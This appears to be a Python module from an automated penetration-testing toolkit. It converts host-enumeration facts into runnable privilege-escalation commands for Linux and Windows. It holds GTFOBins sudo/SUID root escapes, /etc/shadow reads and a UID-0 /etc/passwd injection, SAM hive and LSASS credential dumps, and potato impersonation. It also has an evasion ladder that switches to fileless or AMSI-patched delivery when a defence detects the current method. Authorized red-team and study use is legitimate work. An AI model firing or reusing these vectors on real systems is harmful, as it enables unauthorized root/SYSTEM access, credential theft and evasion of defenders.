"""Privilege-escalation drivers — detect from enum facts, emit a runnable vector.

Each driver is a detect predicate over :class:`~fieldkit.hostenum.HostFacts` that,
when its precondition is met, yields a concrete :class:`Vector`: the exact one-shot
command that *proves* the escalation (it runs ``id`` / ``whoami`` as the elevated
context and captures the result), its three ranking axes, a ``safe_proof``, and a
``cleanup`` for anything it changes. This is the v1 ``whoami /priv`` → route and the
inlined GTFOBins table, turned from print-only advice into vectors the executor can
fire and capture.

The command runs ``id``/``whoami`` rather than spawning an interactive shell so it
survives one-shot capture and honestly evidences the win without leaving a shell
open. The knowledge base here is a curated, high-value subset of the v1 tables; a new
technique is one entry in :data:`GTFO` / :data:`CAPS` / :data:`WIN_PRIVS` or one
driver appended to :data:`DRIVERS`.
"""
import re
from dataclasses import dataclass

from . import kb
from .hostenum import LINUX, WINDOWS, facts_for

#: The proof command per OS: run this as the elevated context, capture the identity.
_PROOF = {LINUX: "id", WINDOWS: "whoami"}


@dataclass(frozen=True)
class Vector:
    """One runnable, ranked escalation. ``command`` is the target-side proof."""

    key: str                 # unique per concrete vector, e.g. "sudo:find", "seimpersonate"
    title: str
    exploitability: str
    safety: str
    detection: str
    command: str
    shell: str               # cmd | powershell | sh — which transport shell to use
    host: str = None
    detail: str = ""
    evidence: str = ""
    safe_proof: str = None
    cleanup: str = None      # cleanup command when the vector changes state, else None
    report_type: str = ""    # the reportkb vector_type a proven finding records under
    family: str = None       # objective shared by delivery alternates (e.g. "seimpersonate")
    delivery: str = None     # the evasion.Technique key this vector's delivery presents
    #: (arsenal_name, remote_path) artifacts this vector needs on the target — the loop
    #: auto-stages these from the arsenal and retries when the target reports them missing.
    stages: tuple = ()

    @property
    def score(self):
        return kb.score(self.exploitability, self.safety, self.detection)

    @property
    def axes(self):
        return f"{self.exploitability}/{self.safety}/{self.detection}"

    @property
    def kind(self):
        return "vector"


@dataclass
class _Ctx:
    host: str
    stage_win: str = "C:\\Windows\\Temp"
    stage_lin: str = "/tmp"


# ------------------------------------------------------------ GTFOBins (curated)

#: {C} is replaced with the proof command. Non-interactive forms only (they must run
#: under one-shot capture); shell-escape forms are read-only — they leave nothing on
#: disk. ``safety``/``cleanup`` override where a form writes to the target.
GTFO = {
    "bash":   {"suid": "bash -p -c '{C}'",               "sudo": "sudo bash -c '{C}'"},
    "sh":     {"suid": "sh -p -c '{C}'",                 "sudo": "sudo sh -c '{C}'"},
    "dash":   {"suid": "dash -p -c '{C}'",               "sudo": "sudo dash -c '{C}'"},
    "find":   {"suid": "find . -exec {C} \\; -quit",     "sudo": "sudo find . -exec {C} \\; -quit"},
    "python": {"suid": "python -c 'import os;os.setuid(0);os.system(\"{C}\")'",
               "sudo": "sudo python -c 'import os;os.system(\"{C}\")'"},
    "perl":   {"suid": "perl -e 'use POSIX qw(setuid);POSIX::setuid(0);system(\"{C}\");'",
               "sudo": "sudo perl -e 'system(\"{C}\");'"},
    "ruby":   {"suid": "ruby -e 'Process::Sys.setuid(0);system(\"{C}\")'",
               "sudo": "sudo ruby -e 'system(\"{C}\")'"},
    "php":    {"suid": "php -r 'posix_setuid(0);system(\"{C}\");'",
               "sudo": "sudo php -r 'system(\"{C}\");'"},
    "node":   {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{C}\",{stdio:[0,1,2]})'"},
    "awk":    {"suid": "awk 'BEGIN{system(\"{C}\")}'",   "sudo": "sudo awk 'BEGIN{system(\"{C}\")}'"},
    "gawk":   {"suid": "gawk 'BEGIN{system(\"{C}\")}'",  "sudo": "sudo gawk 'BEGIN{system(\"{C}\")}'"},
    "env":    {"suid": "env {C}",                        "sudo": "sudo env {C}"},
    "tar":    {"suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='{C}'",
               "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={C}"},
    "gdb":    {"suid": "gdb -nx -batch -ex 'python import os;os.setuid(0)' -ex '!{C}'",
               "sudo": "sudo gdb -nx -batch -ex '!{C}'"},
    "make":   {"suid": "make -s --eval=$'x:\\n\\t-{C}'", "sudo": "sudo make -s --eval=$'x:\\n\\t-{C}'"},
    "docker": {"suid": "docker run -v /:/mnt --rm alpine chroot /mnt {C}",
               "sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt {C}"},
    "nmap":   {"sudo": "echo 'os.execute(\"{C}\")' > /tmp/.f.nse && sudo nmap --script=/tmp/.f.nse",
               "safety": "config-change", "cleanup": "rm -f /tmp/.f.nse"},
}


def _canon(basename):
    """Strip a trailing version so ``python3.8`` matches the ``python`` table key."""
    return re.sub(r"[0-9.]+$", "", basename) or basename


def _gtfo(basename):
    key = _canon(basename)
    return key, GTFO.get(key)


def _use_binary(command, canon, basename):
    """Rewrite the table's generic name to the binary actually found (python->python3.8),
    so the command invokes the real SUID/capped file, not a same-named sibling."""
    if basename == canon:
        return command
    return re.sub(rf"\b{re.escape(canon)}\b", basename, command, count=1)


def _gtfo_vector(mode, basename, ctx):
    """A GTFOBins vector for ``basename`` via ``mode`` (``sudo``/``suid``), or None."""
    key, entry = _gtfo(basename)
    if not entry or mode not in entry:
        return None
    command = _use_binary(entry[mode].replace("{C}", _PROOF[LINUX]), key, basename)
    verb = "sudo" if mode == "sudo" else "SUID"
    return Vector(
        key=f"{mode}:{basename}",
        title=f"{verb} {basename} → root",
        exploitability="high",
        safety=entry.get("safety", "read-only"),
        detection="quiet",
        command=command, shell="sh", host=ctx.host,
        detail=f"{basename} spawns a root context via its {verb} form (GTFOBins).",
        evidence=f"{basename} is {verb}-abusable on this host",
        safe_proof="the vector runs `id` as root; drop the shell escape for a full shell.",
        cleanup=entry.get("cleanup"),
        report_type="gtfobins_sudo" if mode == "sudo" else "gtfobins_suid")


# --------------------------------------------------------------- capabilities

_SETUID_INTERP = {"python", "perl", "ruby", "php", "node"}


def _cap_vector(basename, cap, ctx):
    canon = _canon(basename)
    if cap in ("cap_setuid", "cap_setgid") and canon in _SETUID_INTERP and canon in GTFO \
            and "suid" in GTFO[canon]:
        command = _use_binary(GTFO[canon]["suid"].replace("{C}", _PROOF[LINUX]), canon, basename)
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → root",
            exploitability="high", safety="read-only", detection="quiet",
            command=command, shell="sh", host=ctx.host,
            detail=f"{basename} carries {cap}; it can setuid(0) with no sudo or SUID bit.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="the vector runs `id` as root via the capability.",
            report_type="capability")
    if cap == "cap_dac_read_search":
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → read any file",
            exploitability="medium", safety="read-only", detection="quiet",
            command=f"{basename} /etc/shadow 2>/dev/null | head",
            shell="sh", host=ctx.host,
            detail=f"{basename} can read any file — pull /etc/shadow and crack, or steal /root/.ssh keys.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="reading /etc/shadow proves the primitive without changing anything.",
            report_type="capability")
    if cap == "cap_dac_override":
        return Vector(
            key=f"cap:{basename}", title=f"{cap} on {basename} → write any file → root",
            exploitability="high", safety="config-change", detection="moderate",
            command="echo 'fk::0:0:fk:/root:/bin/bash' >> /etc/passwd && id fk",
            shell="sh", host=ctx.host,
            detail=f"{basename} can write any file — append a UID-0 line to /etc/passwd, then `su fk`.",
            evidence=f"getcap: {basename} {cap}",
            safe_proof="verify the write with `id fk`; then remove the line.",
            cleanup="sed -i '/^fk::0:0:/d' /etc/passwd", report_type="capability")
    return None


# --------------------------------------------------------- Windows privileges

#: privilege token -> the route. ``needs`` names an operator-staged binary where one
#: is required (see SUPPLIED-BINARIES.md); the command references the staging dir.
WIN_PRIVS = {
    "SeBackupPrivilege": dict(
        report_type="sebackup", key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys & '
                'reg save HKLM\\SECURITY {stage}\\sec',
        cleanup="del {stage}\\sam {stage}\\sys {stage}\\sec",
        detail="read the hives, then secretsdump offline for local hashes.",
        safe_proof="the reg-save succeeding proves the read primitive; delete the hives after."),
    "SeDebugPrivilege": dict(
        report_type="lsass", key="sedebug", title="SeDebug → dump LSASS",
        exploitability="high", safety="config-change", detection="loud",
        command='powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump '
                '(Get-Process lsass).Id {stage}\\l.dmp full"',
        cleanup="del {stage}\\l.dmp", shell="powershell",
        detail="minidump LSASS, then pypykatz/mimikatz offline for logged-on creds.",
        safe_proof="a successful dump proves it; the .dmp is loot — pull and delete it."),
    "SeLoadDriverPrivilege": dict(
        report_type="seloaddriver", key="seloaddriver", title="SeLoadDriver → BYOVD kernel r/w → SYSTEM",
        exploitability="high", safety="crash-risk", detection="loud",
        needs="a known-vulnerable signed driver staged in {stage}",
        command='echo BYOVD chain is driver-specific — stage the driver + its loader',
        detail="load a vulnerable signed driver for kernel r/w; loud and can BSOD."),
    "SeTakeOwnershipPrivilege": dict(
        report_type="setakeownership", key="setakeownership", title="SeTakeOwnership → own a SYSTEM file → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='takeown /f C:\\Windows\\System32\\<target> && icacls C:\\Windows\\System32\\<target> /grant %USERNAME%:F',
        detail="take ownership of a SYSTEM-owned service exe/DLL, rewrite its ACL, replace it."),
    "SeManageVolumePrivilege": dict(
        report_type="semanagevolume", key="semanagevolume", title="SeManageVolume → arbitrary write → SYSTEM",
        exploitability="medium", safety="config-change", detection="moderate",
        command='echo SeManageVolume2System: obtain full C:\\ write, then plant a DLL a SYSTEM service loads',
        detail="turns into an arbitrary-file-write primitive; plant a DLL on a service's search path."),
}

#: group membership that is itself a route, independent of held privileges.
WIN_GROUPS = {
    "Backup Operators": dict(
        report_type="sebackup", key="sebackup", title="Backup Operators → dump the SAM/SYSTEM hives",
        exploitability="high", safety="config-change", detection="moderate",
        command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys',
        cleanup="del {stage}\\sam {stage}\\sys",
        detail="the group grants SeBackup in practice — read the hives, dump offline."),
}


#: The impersonation objective (SeImpersonate / SeAssignPrimaryToken → SYSTEM) is one
#: goal reached by several tools whose *delivery methods* differ — so it is a delivery
#: ladder, not one vector. The orchestrator fires them in evasion-posture order and, when
#: one is caught, climbs to the next method (native PE on disk → fileless in-memory →
#: PowerShell script). ``delivery`` names the :mod:`fieldkit.evasion` technique each
#: presents; a live catch marks that technique red so the loop won't re-burn it.
_IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}

WIN_IMPERSONATION = (
    dict(key="seimpersonate:native", delivery="native-exe", detection="moderate",
         title="SeImpersonate → SYSTEM (GodPotato, native EXE)",
         needs="GodPotato.exe staged in {stage}",
         command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
         cleanup="del {stage}\\GodPotato.exe",
         stages=(("GodPotato", "{stage}\\GodPotato.exe"),),
         detail="token impersonation to SYSTEM via GodPotato — a native PE on disk, no AMSI surface."),
    dict(key="seimpersonate:inmem", delivery="inmem-fileless", detection="moderate",
         title="SeImpersonate → SYSTEM (in-memory potato)",
         needs="a potato assembly + an in-memory .NET loader staged in {stage}",
         command='{stage}\\loader.exe potato "cmd /c whoami"',
         cleanup=None,
         detail="same objective loaded reflectively — nothing on disk, but a managed loader "
                "(AMSI surface). Climb here when the on-disk EXE is caught."),
    dict(key="seimpersonate:ps", delivery="ps-amsi-revshell", detection="loud",
         title="SeImpersonate → SYSTEM (PowerShell potato)",
         needs="an AMSI-patched PowerShell potato in {stage}",
         command='powershell -ep bypass -f {stage}\\potato.ps1',
         cleanup="del {stage}\\potato.ps1", shell="powershell",
         detail="script-delivered potato — the most AMSI-exposed path, last resort."),
)


def _impersonation_vector(spec, ctx, evidence):
    stage = ctx.stage_win
    command = spec["command"].replace("{stage}", stage)
    cleanup = (spec.get("cleanup") or "").replace("{stage}", stage) or None
    detail = spec["detail"] + "  needs: " + spec["needs"].replace("{stage}", stage)
    stages = tuple((name, path.replace("{stage}", stage))
                   for name, path in spec.get("stages", ()))
    return Vector(
        key=spec["key"], title=spec["title"],
        exploitability="high", safety="config-change", detection=spec["detection"],
        command=command, shell=spec.get("shell", "cmd"), host=ctx.host, detail=detail,
        evidence=evidence,
        safe_proof="the vector runs `whoami` in the SYSTEM context.",
        cleanup=cleanup, report_type="seimpersonate",
        family="seimpersonate", delivery=spec["delivery"], stages=stages)


def _win_vector(spec, ctx, evidence):
    stage = ctx.stage_win
    command = spec["command"].replace("{stage}", stage)
    cleanup = spec.get("cleanup", "").replace("{stage}", stage) or None
    detail = spec["detail"]
    if spec.get("needs"):
        detail += "  needs: " + spec["needs"].replace("{stage}", stage)
    return Vector(
        key=spec["key"], title=spec["title"],
        exploitability=spec["exploitability"], safety=spec["safety"],
        detection=spec["detection"], command=command,
        shell=spec.get("shell", "cmd"), host=ctx.host, detail=detail,
        evidence=evidence,
        safe_proof=spec.get("safe_proof", "the vector runs `whoami` in the elevated context."),
        cleanup=cleanup)


# ------------------------------------------------------------------- drivers

def _d_sudo_all(facts, ctx):
    if facts.sudo_all:
        yield Vector(
            key="sudo:ALL", title="sudo grants full root",
            exploitability="high", safety="read-only", detection="quiet",
            command="sudo -n id", shell="sh", host=ctx.host,
            detail="sudo -l shows (ALL) — become root directly with `sudo -i`.",
            evidence="sudo -l: (ALL : ALL) ALL",
            safe_proof="`sudo -n id` returns uid=0 without a password prompt.",
            report_type="sudo_misconfig")


def _d_sudo_gtfo(facts, ctx):
    if facts.sudo_all:
        return
    for binname in sorted(facts.sudo_binaries):
        vector = _gtfo_vector("sudo", binname, ctx)
        if vector:
            yield vector


def _d_suid_gtfo(facts, ctx):
    for binname in sorted(facts.suid):
        vector = _gtfo_vector("suid", binname, ctx)
        if vector:
            yield vector


def _d_caps(facts, ctx):
    for binname, cap in sorted(facts.caps.items()):
        vector = _cap_vector(binname, cap, ctx)
        if vector:
            yield vector


def _d_docker_group(facts, ctx):
    if "docker" in facts.groups and not facts.is_root:
        yield Vector(
            key="group:docker", title="docker group → root",
            exploitability="high", safety="read-only", detection="quiet",
            command="docker run -v /:/mnt --rm alpine chroot /mnt id",
            shell="sh", host=ctx.host,
            detail="the docker group is root-equivalent — mount / into a container.",
            evidence="member of the docker group",
            safe_proof="the container runs `id` as root over the mounted host fs.",
            report_type="docker_group")


def _d_sudo_env(facts, ctx):
    if facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}:
        which = ", ".join(sorted(facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}))
        yield Vector(
            key="sudo:env-preload", title=f"sudo preserves {which} → root",
            exploitability="high", safety="config-change", detection="moderate",
            command="# build a .so whose constructor setuid(0)+execs, then: sudo LD_PRELOAD=/tmp/p.so <allowed-cmd>",
            shell="sh", host=ctx.host,
            detail=f"sudo keeps {which}; preload a .so that runs as root before an allowed command.",
            evidence=f"sudo -l: env_keep+={which}",
            safe_proof="prove with a .so that only runs `id`; remove /tmp/p.so after.",
            cleanup="rm -f /tmp/p.so", report_type="ld_preload")


def _d_win_privs(facts, ctx):
    seen = set()
    impersonation = facts.privs & _IMPERSONATION_PRIVS
    if impersonation:
        which = ", ".join(sorted(impersonation))
        for spec in WIN_IMPERSONATION:
            yield _impersonation_vector(spec, ctx, evidence=f"whoami /priv: {which}")
        seen.add("seimpersonate")
    for priv in sorted(facts.privs):
        spec = WIN_PRIVS.get(priv)
        if spec and spec["key"] not in seen:
            seen.add(spec["key"])
            yield _win_vector(spec, ctx, evidence=f"whoami /priv: {priv}")
    for group in sorted(facts.win_groups):
        spec = WIN_GROUPS.get(group)
        if spec and spec["key"] not in seen:
            seen.add(spec["key"])
            yield _win_vector(spec, ctx, evidence=f"member of {group}")


def _d_win_aie(facts, ctx):
    if facts.always_install_elevated:
        stage = ctx.stage_win
        yield Vector(
            key="aie", title="AlwaysInstallElevated → SYSTEM",
            exploitability="high", safety="config-change", detection="moderate",
            command=f"msiexec /quiet /qn /i {stage}\\evil.msi",
            shell="cmd", host=ctx.host,
            detail="both AlwaysInstallElevated keys are set — any .msi installs as SYSTEM.",
            evidence="AlwaysInstallElevated=0x1 in HKLM and HKCU",
            safe_proof="build the msi to run `whoami`/add an admin; a SYSTEM whoami proves it.",
            cleanup=f"del {stage}\\evil.msi")


def _d_win_unquoted(facts, ctx):
    for _, path in facts.unquoted_services:
        # the first space-truncated candidate Windows would try
        candidate = path.split(" ", 1)[0] + ".exe"
        yield Vector(
            key=f"unquoted:{path}", title="unquoted service path → SYSTEM",
            exploitability="medium", safety="config-change", detection="moderate",
            command=f"REM plant a payload at {candidate}, then: sc stop <svc> & sc start <svc>",
            shell="cmd", host=ctx.host,
            detail=f"unquoted service path {path!r} — plant an exe at the first writable candidate.",
            evidence=f"unquoted service path: {path}",
            safe_proof="check icacls on the candidate's parent dir for a writable ACL first.",
            cleanup=f"del {candidate}")


#: OS -> the drivers that apply. Append to extend the knowledge base.
DRIVERS = {
    LINUX: (_d_sudo_all, _d_sudo_gtfo, _d_suid_gtfo, _d_caps, _d_docker_group, _d_sudo_env),
    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted),
}


def vectors_for(facts, host_ip, *, stage_win=None, stage_lin=None):
    """Every escalation vector the facts justify on one host, best-ranked first."""
    ctx = _Ctx(host=host_ip,
               stage_win=stage_win or "C:\\Windows\\Temp",
               stage_lin=stage_lin or "/tmp")
    vectors = []
    for driver in DRIVERS.get(facts.os, ()):
        vectors.extend(driver(facts, ctx))
    vectors.sort(key=lambda v: (-v.score, v.key))
    return vectors


def vectors_from_state(store, *, stage_win=None, stage_lin=None):
    """Every privesc vector across every enumerated host, best-ranked first."""
    out = []
    for host in store.hosts():
        facts = facts_for(store, host["id"])
        out.extend(vectors_for(facts, host["ip"], stage_win=stage_win, stage_lin=stage_lin))
    out.sort(key=lambda v: (-v.score, v.host or "", v.key))
    return out


def find_vector(store, host_ip, key, *, stage_win=None, stage_lin=None):
    """The vector with ``key`` on ``host_ip`` from current enum facts, or None."""
    host = store.host_by_ip(host_ip)
    if host is None:
        return None
    facts = facts_for(store, host["id"])
    for vector in vectors_for(facts, host_ip, stage_win=stage_win, stage_lin=stage_lin):
        if vector.key == key:
            return vector
    return None
